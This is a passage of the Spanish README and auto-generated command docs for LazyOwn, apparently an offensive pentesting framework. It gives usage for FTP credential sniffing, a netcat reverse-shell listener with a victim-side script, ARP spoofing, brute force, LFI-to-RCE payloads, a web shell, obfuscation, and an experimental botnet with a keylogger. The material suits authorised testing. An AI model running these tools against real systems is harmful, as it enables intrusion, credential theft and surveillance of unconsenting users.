<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a>    <span class="at">--headers</span> <span class="st">&#39;{&quot;User-Agent&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a>    <span class="at">--params</span> <span class="st">&#39;{&quot;param1&quot;: &quot;value1&quot;, &quot;param2&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
<span id="cb25-6"><a href="#cb25-6" aria-hidden="true" tabindex="-1"></a>    <span class="at">--data</span> <span class="st">&#39;{&quot;key1&quot;: &quot;LAZYFUZZ&quot;, &quot;key2&quot;: &quot;value2&quot;}&#39;</span> <span class="dt">\</span></span>
<span id="cb25-7"><a href="#cb25-7" aria-hidden="true" tabindex="-1"></a>    <span class="at">--json_data</span> <span class="st">&#39;{&quot;key3&quot;: &quot;LAZYFUZZ&quot;}&#39;</span> <span class="dt">\</span></span>
<span id="cb25-8"><a href="#cb25-8" aria-hidden="true" tabindex="-1"></a>    <span class="at">--proxy_port</span> 8080 <span class="dt">\</span></span>
<span id="cb25-9"><a href="#cb25-9" aria-hidden="true" tabindex="-1"></a>    <span class="at">-w</span> /usr/share/seclist/SecLists-master/Discovery/Variables/awesome-environment-variable-names.txt <span class="dt">\</span></span>
<span id="cb25-10"><a href="#cb25-10" aria-hidden="true" tabindex="-1"></a> </span></code></pre></div>
<p><img
src="https://github.com/grisuno/LazyOwn/assets/1097185/dc66fdc2-cd7d-4b79-92c6-dd43d376ee0e"
alt="image" /> PD: para usar el diccionario que utilizo realizar dentro
de /usr/share/seclist el siguiente comando</p>
<div class="sourceCode" id="cb26"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> <span class="at">-c</span> https://github.com/danielmiessler/SecLists/archive/master.zip <span class="at">-O</span> SecList.zip <span class="dt">\</span></span>
<span id="cb26-2"><a href="#cb26-2" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;&amp;</span> <span class="fu">unzip</span> SecList.zip <span class="dt">\</span></span>
<span id="cb26-3"><a href="#cb26-3" aria-hidden="true" tabindex="-1"></a><span class="kw">&amp;&amp;</span> <span class="fu">rm</span> <span class="at">-f</span> SecList.zip</span></code></pre></div>
<h2 id="uso-modo-lazyown-ftp-sniff">Uso modo LazyOwn FTP Sniff</h2>
<p>este modulo sirve para buscar claves en la red de servidores ftp,
algunos me dirán que no se ya no se usa pero se sorprenderian en los
entornos productivos en infraestructura critica que e visto maquinas con
FTP’s masivos corriendo en sus servidores :)</p>
<div class="sourceCode" id="cb27"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> device eth0</span>
<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazyftpsniff</span></code></pre></div>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/d2d1c680-fc03-4f60-adc4-20248f3e3859"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<h2 id="uso-modo-lazyreverseshell">Uso modo LazyReverseShell</h2>
<p>primero nos ponemos en escucha con el comando</p>
<div class="sourceCode" id="cb28"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">nc</span> <span class="at">-nlvp</span> 1337 <span class="co">#o el puerto que escojamos </span></span></code></pre></div>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/dfb7a81d-ac7f-4b8b-8f1f-717e058260b5"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<p>para luego en la maquina victima</p>
<div class="sourceCode" id="cb29"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazyreverse_shell.sh</span> <span class="at">--ip</span> 127.0.0.1 <span class="at">--puerto</span> 1337</span></code></pre></div>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/b489be5d-0b53-4054-995f-6106c9c95190"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<h2 id="uso-modo-lazy-curl-to-recon">Uso modo Lazy Curl to recon</h2>
<p>el modulo está en modules y se usa así:</p>
<div class="sourceCode" id="cb30"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="fu">chmod</span> +x lazycurl.sh</span></code></pre></div>
<p>Ejecutar el script con los parámetros deseados. Por ejemplo:</p>
<div class="sourceCode" id="cb31"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> GET <span class="at">--url</span> http://10.10.10.10</span></code></pre></div>
<p>Ejemplos de uso</p>
<p>Enviar una solicitud GET:</p>
<div class="sourceCode" id="cb32"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> GET <span class="at">--url</span> http://10.10.10.10</span></code></pre></div>
<p>Enviar una solicitud POST:</p>
<div class="sourceCode" id="cb33"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> POST <span class="at">--url</span> http://10.10.10.10 <span class="at">--data</span> <span class="st">&quot;param1=value1&amp;param2=value2&quot;</span></span></code></pre></div>
<p>Probar un método TRACE:</p>
<div class="sourceCode" id="cb34"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb34-1"><a href="#cb34-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> TRACE <span class="at">--url</span> http://10.10.10.10</span>
<span id="cb34-2"><a href="#cb34-2" aria-hidden="true" tabindex="-1"></a><span class="kw">```</span><span class="fu">sh</span></span>
<span id="cb34-3"><a href="#cb34-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-4"><a href="#cb34-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Subir</span> un archivo:</span>
<span id="cb34-5"><a href="#cb34-5" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb34-6"><a href="#cb34-6" aria-hidden="true" tabindex="-1"></a><span class="kw">```</span>sh</span>
<span id="cb34-7"><a href="#cb34-7" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> UPLOAD <span class="at">--url</span> http://10.10.10.10 <span class="at">--file</span> file.txt</span></code></pre></div>
<p>Realizar fuerza bruta con una wordlist:</p>
<div class="sourceCode" id="cb35"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb35-1"><a href="#cb35-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazycurl.sh</span> <span class="at">--mode</span> BRUTE_FORCE <span class="at">--url</span> http://10.10.10.10 <span class="at">--wordlist</span> /usr/share/wordlists/rockyou.txt</span></code></pre></div>
<p>Asegúrate de ajustar los parámetros según tus necesidades y de que
los valores que pases a las opciones sean válidos para cada caso.</p>
<h2 id="uso-modo-arpspoofing">Uso modo ARPSpoofing</h2>
<p>el script provee de un ataque de ARPSpoofing mediante scapy en el
payload debe ser seteado el lhost rhost y el device que pondràs a
arpspoofear</p>
<div class="sourceCode" id="cb36"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb36-1"><a href="#cb36-1" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> rhost 192.168.1.100</span>
<span id="cb36-2"><a href="#cb36-2" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> lhost 192.168.1.1</span>
<span id="cb36-3"><a href="#cb36-3" aria-hidden="true" tabindex="-1"></a><span class="bu">set</span> device eth0</span>
<span id="cb36-4"><a href="#cb36-4" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazyarpspoofing</span></code></pre></div>
<h2 id="uso-modo-lazygathering">Uso modo LazyGathering</h2>
<p>script que nos provee una visión de rayos x en cuanto al sistema en
cuestion donde estamos ejecutando la herramiente</p>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/6d1416f9-10cd-4316-8a62-92c3f10082e0"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<div class="sourceCode" id="cb37"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazygath</span></code></pre></div>
<h2 id="uso-modo-lazy-own-lfi-rfi-2-rce">Uso modo Lazy Own Lfi Rfi 2
Rce</h2>
<p>El modo Lfi Rfi 2 Rce es par aprobar algunos payloads más conocidos a
los parametros de payload.json</p>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/4259a469-8c8e-4d11-8db5-39a3bf15059c"
alt="image" />
<figcaption aria-hidden="true">image</figcaption>
</figure>
<div class="sourceCode" id="cb38"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span></span>
<span id="cb38-2"><a href="#cb38-2" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazylfi2rce</span></code></pre></div>
<h2 id="uso-modo-lazyown-sniffer">Uso modo LazyOwn Sniffer</h2>
<p><a href="https://www.youtube.com/watch?v=_-DDiiMrIlE"
class="uri">https://www.youtube.com/watch?v=_-DDiiMrIlE</a></p>
<p>El modo sniffer nos permite capturar el trafico de red por interfaces
con la opcion -i que es la opción obligatoria, dentro de muchas tras
opciones no obligatorias, usage: lazysniff.py [-h] -i INTERFACE [-c
COUNT] [-f FILTER] [-p PCAP] lazysniff.py: error: the following
arguments are required: -i/–interface</p>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/db1e05a0-026e-414f-9ec6-0a9ef2cb06fe"
alt="Captura de pantalla 2024-06-05 031231" />
<figcaption aria-hidden="true">Captura de pantalla 2024-06-05
031231</figcaption>
</figure>
<p>usando desde el framework se debe setear device con set device [eth0,
wla0,eth1, wlan1, etc] segun sea su interface y luego:</p>
<div class="sourceCode" id="cb39"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazysniff</span></code></pre></div>
<h2 id="uso-modo-lazyatack">Uso modo LazyAtack</h2>
<p>Este script de pentesting en Bash permite ejecutar una serie de
pruebas de seguridad en modo servidor (máquina víctima) o en modo
cliente (máquina atacante). Dependiendo del modo seleccionado, ofrece
diferentes opciones y funcionalidades para llevar a cabo diversas
acciones de prueba de penetración.</p>
<p>Opciones del Script Modo Servidor:</p>
<p>Ejecuta en la máquina víctima. Ofrece opciones como iniciar un
servidor HTTP, configurar netcat para escuchar conexiones, enviar
archivos mediante netcat, configurar una shell reversa, entre otros.
Modo Cliente:</p>
<p>Ejecuta en la máquina atacante. Ofrece opciones como descargar listas
de SecLists, escanear puertos, enumerar servicios HTTP, verificar
conectividad, monitorear procesos, ejecutar ataques LFI, entre otros.
Ejemplos de Uso Uso Básico</p>
<div class="sourceCode" id="cb40"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb40-1"><a href="#cb40-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazyatack.sh</span> <span class="at">--modo</span> servidor <span class="at">--ip</span> 192.168.1.1 <span class="at">--atacante</span> 192.168.1.100</span></code></pre></div>
<div class="sourceCode" id="cb41"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb41-1"><a href="#cb41-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./lazyatack.sh</span> <span class="at">--modo</span> cliente <span class="at">--url</span> http://victima.com <span class="at">--ip</span> 192.168.1.10</span></code></pre></div>
<p>Esto ejecuta el script en modo cliente, configurando la URL de la
víctima como <a href="http://victima.com"
class="uri">http://victima.com</a> y la IP de la víctima como
192.168.1.10.</p>
<h2 id="funciones-del-script">Funciones del Script</h2>
<pre><code>Funciones del Script
Descargar SecLists: Descarga y extrae las listas de SecLists para su uso.
Escanear Puertos: Ejecuta un escaneo completo de puertos usando nmap.
Escanear Puertos Específicos: Escanea puertos específicos (22, 80, 443).
Enumerar Servicios HTTP: Enumera servicios HTTP en la URL víctima.
Iniciar Servidor HTTP: Inicia un servidor HTTP en el puerto 80.
Configurar Netcat: Configura netcat para escuchar en el puerto 443.
Enviar Archivo Mediante Netcat: Envía un archivo a una escucha netcat.
Verificar Conectividad: Verifica la conectividad mediante ping y tcpdump.
Verificar Conectividad con Curl: Verifica la conectividad usando curl.
Configurar Shell Reversa: Configura una shell reversa.
Escuchar Shell con Netcat: Escucha una shell con netcat.
Monitorear Procesos: Monitorea los procesos en ejecución.
Ejecutar Wfuzz: Ejecuta un ataque de enumeración de directorios web con wfuzz.
Comprobar Permisos Sudo: Comprueba los permisos de sudo.
Explotar LFI: Explota una vulnerabilidad de inclusión de archivos locales.
Configurar TTY: Configura TTY para una sesión shell más estable.
Eliminar Archivos de Forma Segura: Elimina archivos de forma segura.
Obtener Root Shell mediante Docker: Obtiene una root shell mediante Docker.
Enumerar Archivos con SUID: Enumera archivos con permisos SUID.
Listar Timers de Systemd: Lista timers de systemd.
Comprobar Rutas de Comandos: Comprueba rutas de comandos.
Abusar de Tar: Abusa de tar para ejecutar una shell.
Enumerar Puertos Abiertos: Enumera puertos abiertos.
Eliminar Contenedores Docker: Elimina todos los contenedores Docker.
Escanear Red: Escanea la red con secuencia y xargs.</code></pre>
<h2 id="experimental-lazyownwebshell-en-python">Experimental
LazyOwnWebShell en python</h2>
<p>Corre en <a href="http://localhost:5000"
class="uri">http://localhost:5000</a> experimental, ya que aun no
funciona la salida de la webshell de cara al navegador. pero los
comandos si son ejecutados correctamente. por eso está en modo
experimental… por no decir que aun tiene bugs xD</p>
<figure>
<img
src="https://github.com/grisuno/LazyOwn/assets/1097185/4bc6e25a-5c69-4dbc-a1b1-a3c455b38bfd"
alt="Captura de pantalla 2024-06-09 030335" />
<figcaption aria-hidden="true">Captura de pantalla 2024-06-09
030335</figcaption>
</figure>
<div class="sourceCode" id="cb43"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="ex">python3</span> main.py </span></code></pre></div>
<h2 id="experimental-ofuscación-mediante-pyinstaller">Experimental
ofuscación mediante pyinstaller</h2>
<p>esto está en modo experimental y no funciona del todo, ya que tiene
un problema de rutas. pronto ya contará con ofuscación mediante
pyinstaller</p>
<div class="sourceCode" id="cb44"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb44-1"><a href="#cb44-1" aria-hidden="true" tabindex="-1"></a><span class="ex">./py2el.sh</span></span></code></pre></div>
<h2 id="experimental-exploit-netbios">Experimental exploit netbios</h2>
<p>esto está en modo experimental ya que aun no funciona… (proximamente
quizas una implementacion de eternalblue entre otras cositas…)</p>
<div class="sourceCode" id="cb45"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb45-1"><a href="#cb45-1" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazynetbios</span></code></pre></div>
<h2
id="experimental-lazybotnet-con-keylogger-para-windows-y-linux">Experimental
LazyBotNet con keylogger para windows y Linux</h2>
<p>esto está en modo experimental y no funciona la desencriptación del
log del keylogger xD acá vemos por primera vez en accion el comando
payload el cual nos setea toda la config en nuestro payload.json así
podemos precargar la config antes de arrancar con el framework</p>
<div class="sourceCode" id="cb46"><pre
class="sourceCode sh"><code class="sourceCode bash"><span id="cb46-1"><a href="#cb46-1" aria-hidden="true" tabindex="-1"></a><span class="ex">payload</span></span>
<span id="cb46-2"><a href="#cb46-2" aria-hidden="true" tabindex="-1"></a><span class="ex">run</span> lazybotnet</span></code></pre></div>
<h2 id="menús-interactivos">Menús Interactivos</h2>
<p>El script presenta menús interactivos para seleccionar las acciones a
realizar. En modo servidor, muestra opciones relevantes para la máquina
víctima, y en modo cliente, muestra opciones relevantes para la máquina
atacante.</p>
<p>Interrupción Limpia El script maneja la señal SIGINT (usualmente
generada por Control + C) para salir limpiamente.</p>
<h2 id="licencia">Licencia</h2>
<p>Este proyecto está licenciado bajo la Licencia GPL v3. La información
contenida en GTFOBins es propiedad de sus autores, a quienes se les
agradece enormemente por la información proporcionada.</p>
<h2 id="agradecimientos">Agradecimientos</h2>
<p>Un agradecimiento especial a <a
href="https://gtfobins.github.io/">GTFOBins</a> por la valiosa
información que proporcionan y a ti por utilizar este proyecto. Tambien
¡Gracias por tu apoyo Tito S4vitar! quien hace una tarea extraordinarìa
de divulgaciòn. por supuesto que utilizo la funcion extractPorts en mi
.zshrc :D</p>
<h3 id="agradecimientos-a-pwntomate">Agradecimientos a pwntomate 🍅</h3>
<p>una excelente herramienta que adapte un poco para que funcione con el
proyecto todos los creditos son de su autor honze-net Andreas Hontzia
visiten y denle amor al proyecto <a
href="https://github.com/honze-net/pwntomate"
class="uri">https://github.com/honze-net/pwntomate</a></p>
<h2 id="abstract">Abstract</h2>
<p>LazyOwn es un marco de trabajo que agiliza el flujo del mismo y
automatiza muchas tareas y pruebas mediante alias y distintas
herramientas es como una navaja multiproposito con navajas
multipropisitos para el hacking xD</p>
<h1 id="documentation-by-readmeneitor.py">Documentation by
readmeneitor.py</h1>
<p>Documentación creada automaticamente por el script readmeneitor.py
creado para este proyecto, quizas algún día tenga su propio repo por
ahora no lo veo necesario.</p>
<h1 id="commands.md-documentation-by-readmeneitor.py">COMMANDS.md
Documentation by readmeneitor.py</h1>
<h2 id="xor_encrypt_decrypt">xor_encrypt_decrypt</h2>
<p>XOR Encrypt or Decrypt data with a given key</p>
<h2 id="init"><strong>init</strong></h2>
<p>Initializer for the LazyOwnShell class.</p>
<p>This method sets up the initial parameters and scripts for an
instance of the LazyOwnShell class. It initializes a dictionary of
parameters with default values and a list of script names that are part
of the LazyOwnShell toolkit.</p>
<p>Attributes: params (dict): A dictionary of parameters with their
default values. scripts (list): A list of script names included in the
toolkit. output (str): An empty string to store output or results.</p>
<h2 id="default">default</h2>
<p>Handles undefined commands, including aliases.</p>
<p>This method checks if a given command (or its alias) exists within
the class by attempting to find a corresponding method. If the command
or alias is not found, it prints an error message.</p>
<p>:param line: The command or alias to be handled. :type line: str
:return: None</p>
<h2 id="one_cmd">one_cmd</h2>
<p>Internal function to execute commands.</p>
<p>This method attempts to execute a given command using
<code>onecmd</code> and captures the output. It sets the
<code>output</code> attribute based on whether the command was executed
successfully or an exception occurred.</p>
<p>:param command: The command to be executed. :type command: str
:return: A message indicating the result of the command execution.
:rtype: str</p>
<h2 id="set">set</h2>
<p>Set a parameter value.</p>
<p>This function takes a line of input, splits it into a parameter and a
value, and sets the specified parameter to the given value if the
parameter exists.</p>
<p>:param line: A string containing the parameter and value to be set.
Expected format: ‘<parameter> <value>’. :type line: str :return: None
:raises: ValueError if the input line does not contain exactly two
elements.</p>
<h2 id="show">show</h2>
<p>Show the current parameter values.</p>
<p>This function iterates through the current parameters and their
values, printing each parameter and its associated value.</p>
<p>:param line: This parameter is not used in the function. :type line:
str :return: None</p>
<h2 id="list">list</h2>
<p>Lists all available scripts in the modules directory.</p>
<p>This method prints a list of available scripts in a formatted manner,
arranging them into columns. It shows each script with sufficient
spacing for readability.</p>
<p>:param line: This parameter is not used in the method. :type line:
str :return: None</p>
<h2 id="run">run</h2>
<p>Runs a specific LazyOwn script.</p>
<p>This method executes a script from the LazyOwn toolkit based on the
provided script name. If the script is not recognized, it prints an
error message. To see available scripts, use the <code>list</code> or
<code>help list</code> commands.</p>
<p>:param line: The command line input containing the script name. :type
line: str :return: None</p>
<h2 id="lazysearch">lazysearch</h2>
<p>Runs the internal module <code>modules/lazysearch.py</code>.</p>
<p>This method executes the <code>lazysearch</code> script from the
specified path, using the <code>binary_name</code> parameter from the
<code>self.params</code> dictionary. If <code>binary_name</code> is not
set, it prints an error message.</p>
<p>:return: None</p>
<h2 id="lazysearch_gui">lazysearch_gui</h2>
<p>Run the internal module located at
<code>modules/LazyOwnExplorer.py</code>.</p>
<p>This method executes the <code>LazyOwnExplorer.py</code> script,
which is used for graphical user interface (GUI) functionality within
the LazyOwn framework.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Calls <code>self.run_script</code> with
<code>LazyOwnExplorer.py</code> to execute the GUI module.</li>
</ol>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the
<code>modules/LazyOwnExplorer.py</code> script is present in the
<code>modules</code> directory. 2. Run the script with:
<code>python3 modules/LazyOwnExplorer.py</code></p>
<p>Example: To run <code>LazyOwnExplorer.py</code> directly, execute:
<code>python3 modules/LazyOwnExplorer.py</code></p>
<p>Note: - Ensure that the script has the appropriate permissions and
dependencies to run. - Verify that your environment supports GUI
operations if using this script in a non-graphical environment.</p>
<h2 id="lazyown-1">lazyown</h2>
<p>Run the internal module located at
<code>modules/lazyown.py</code>.</p>
<p>This method executes the <code>lazyown.py</code> script, which is a
core component of the LazyOwn framework.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Calls <code>self.run_script</code> with <code>lazyown.py</code> to
execute the script.</li>
</ol>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the <code>modules/lazyown.py</code>
script is present in the <code>modules</code> directory. 2. Run the
script with: <code>python3 modules/lazyown.py</code></p>
<p>Example: To run <code>lazyown.py</code> directly, execute:
<code>python3 modules/lazyown.py</code></p>
<p>Note: - Ensure that the script has the appropriate permissions and
dependencies to run.</p>
<h2 id="update_db">update_db</h2>
<p>Run the internal module located at
<code>modules/update_db.sh</code>.</p>
<p>This method executes the <code>update_db.sh</code> script to update
the database of binary exploitables from <code>gtofbins</code>.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Executes the <code>update_db.sh</code> script located in the
<code>modules</code> directory using <code>os.system</code>.</li>
</ol>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the
<code>modules/update_db.sh</code> script is present in the
<code>modules</code> directory. 2. Run the script with:
<code>./modules/update_db.sh</code></p>
<p>Example: To manually update the database, execute:
<code>./modules/update_db.sh</code></p>
<p>Note: - Ensure that the script has execute permissions. - The script
should be run with the necessary privileges if required.</p>
<h2 id="lazynmap">lazynmap</h2>
<p>Runs the internal module <code>modules/lazynmap.sh</code> for
multiple Nmap scans.</p>
<p>This method executes the <code>lazynmap</code> script, using the
current working directory and the <code>rhost</code> parameter from the
<code>self.params</code> dictionary as the target IP. If
<code>rhost</code> is not set, it prints an error message.</p>
<p>:return: None</p>
<h2 id="lazywerkzeugdebug">lazywerkzeugdebug</h2>
<p>Run the internal module located at
<code>modules/lazywerkzeug.py</code> in debug mode.</p>
<p>This method executes the <code>lazywerkzeug.py</code> script with the
specified parameters for remote and local hosts and ports. It is used to
test Werkzeug in debug mode.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>rhost</code>, <code>lhost</code>,
<code>rport</code>, and <code>lport</code> values from
<code>self.params</code>.</li>
<li>Checks if all required parameters are set. If not, prints an error
message and returns.</li>
<li>Calls <code>self.run_script</code> with <code>lazywerkzeug.py</code>
and the specified parameters.</li>
</ol>
<p>:param rhost: The remote host address. :type rhost: str</p>
<p>:param lhost: The local host address. :type lhost: str</p>
<p>:param rport: The remote port number. :type rport: int</p>
<p>:param lport: The local port number. :type lport: int</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code>,
<code>lhost</code>, <code>rport</code>, and <code>lport</code> are set
in <code>self.params</code>. 2. The script
<code>modules/lazywerkzeug.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazywerkzeug.py &lt;rhost&gt; &lt;rport&gt; &lt;lhost&gt; &lt;lport&gt;</code></p>
<p>Example: To run <code>lazywerkzeug.py</code> with <code>rhost</code>
set to <code>"127.0.0.1"</code>, <code>rport</code> to
<code>5000</code>, <code>lhost</code> to <code>"localhost"</code>, and
<code>lport</code> to <code>8000</code>, set:
<code>self.params["rhost"] = "127.0.0.1"</code>
<code>self.params["rport"] = 5000</code>
<code>self.params["lhost"] = "localhost"</code>
<code>self.params["lport"] = 8000</code> Then call:
<code>run_lazywerkzeugdebug()</code></p>
<p>Note: - Ensure that <code>modules/lazywerkzeug.py</code> has the
appropriate permissions and dependencies to run. - Verify that the
specified hosts and ports are correct and available.</p>
<h2 id="lazygath">lazygath</h2>
<p>Run the internal module located at <code>modules/lazygat.sh</code>.
to gathering the sistem :)</p>
<p>This method executes the <code>lazygat.sh</code> script located in
the <code>modules</code> directory with <code>sudo</code>
privileges.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the current working directory.</li>
<li>Executes the <code>lazygat.sh</code> script using <code>sudo</code>
to ensure it runs with elevated permissions.</li>
</ol>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that the <code>modules/lazygat.sh</code>
script is present in the <code>modules</code> directory. 2. Run the
script with: <code>sudo ./modules/lazygat.sh</code></p>
<p>Example: To manually run the script with elevated privileges,
execute: <code>sudo ./modules/lazygat.sh</code></p>
<p>Note: - Ensure that the script has execute permissions. - The script
should be run with <code>sudo</code> if it requires elevated
privileges.</p>
<h2 id="lazynmapdiscovery">lazynmapdiscovery</h2>
<p>Runs the internal module <code>modules/lazynmap.sh</code> with
discovery mode.</p>
<p>This method executes the <code>lazynmap</code> script in discovery
mode. It uses the current working directory for locating the script.</p>
<p>:return: None</p>
<h2 id="lazysniff">lazysniff</h2>
<p>Run the sniffer internal module located at
<code>modules/lazysniff.py</code> with the specified parameters.</p>
<p>This method executes the script with the following arguments:</p>
<ul>
<li><code>device</code>: The network interface to be used for sniffing,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>device</code> value from
<code>self.params</code>.</li>
<li>Sets up the environment variables <code>LANG</code> and
<code>TERM</code> to ensure proper script execution.</li>
<li>Uses <code>subprocess.run</code> to execute the
<code>lazysniff.py</code> script with the <code>-i</code> option to
specify the network interface.</li>
</ol>
<p>:param device: The network interface to be used for sniffing. :type
device: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>device</code> is set in
<code>self.params</code>. 2. The script
<code>modules/lazysniff.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazysniff.py -i &lt;device&gt;</code></p>
<p>Example: To run <code>lazysniff</code> with <code>device</code> set
to <code>"eth0"</code>, set: <code>self.params["device"] = "eth0"</code>
Then call: <code>run_lazysniff()</code></p>
<p>Note: - Ensure that <code>modules/lazysniff.py</code> has the
appropriate permissions and dependencies to run. - Ensure that the
network interface specified is valid and properly configured.</p>
<h2 id="lazyftpsniff">lazyftpsniff</h2>
<p>Run the sniffer ftp internal module located at
<code>modules/lazyftpsniff.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>device</code>: The network interface to be used for sniffing,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>device</code> value from
<code>self.params</code>.</li>
<li>Sets up the environment variables <code>LANG</code> and
<code>TERM</code> to ensure proper script execution.</li>
<li>Uses <code>subprocess.run</code> to execute the
<code>lazyftpsniff.py</code> script with the <code>-i</code> option to
specify the network interface.</li>
</ol>
<p>:param device: The network interface to be used for sniffing. :type
device: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>device</code> is set in
<code>self.params</code>. 2. The script
<code>modules/lazyftpsniff.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyftpsniff.py -i &lt;device&gt;</code></p>
<p>Example: To run <code>lazyftpsniff</code> with <code>device</code>
set to <code>"eth0"</code>, set:
<code>self.params["device"] = "eth0"</code> Then call:
<code>run_lazyftpsniff()</code></p>
<p>Note: - Ensure that <code>modules/lazyftpsniff.py</code> has the
appropriate permissions and dependencies to run. - Ensure that the
network interface specified is valid and properly configured.</p>
<h2 id="lazynetbios">lazynetbios</h2>
<p>Run the internal module to search netbios vuln victims, located at
<code>modules/lazynetbios.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>startip</code>: The starting IP address for the NetBIOS scan,
specified in <code>self.params</code>.</li>
<li><code>endip</code>: The ending IP address for the NetBIOS scan,
specified in <code>self.params</code>.</li>
<li><code>spoof_ip</code>: The IP address to be used for spoofing,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>startip</code>, <code>endip</code>, and
<code>spoof_ip</code> values from <code>self.params</code>.</li>
<li>Uses <code>subprocess.run</code> to execute the
<code>lazynetbios.py</code> script with the specified parameters.</li>
</ol>
<p>:param startip: The starting IP address for the NetBIOS scan. :type
startip: str</p>
<p>:param endip: The ending IP address for the NetBIOS scan. :type
endip: str</p>
<p>:param spoof_ip: The IP address to be used for spoofing. :type
spoof_ip: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>startip</code>,
<code>endip</code>, and <code>spoof_ip</code> are set in
<code>self.params</code>. 2. The script
<code>modules/lazynetbios.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazynetbios.py &lt;startip&gt; &lt;endip&gt; &lt;spoof_ip&gt;</code></p>
<p>Example: To run <code>lazynetbios</code> with <code>startip</code>
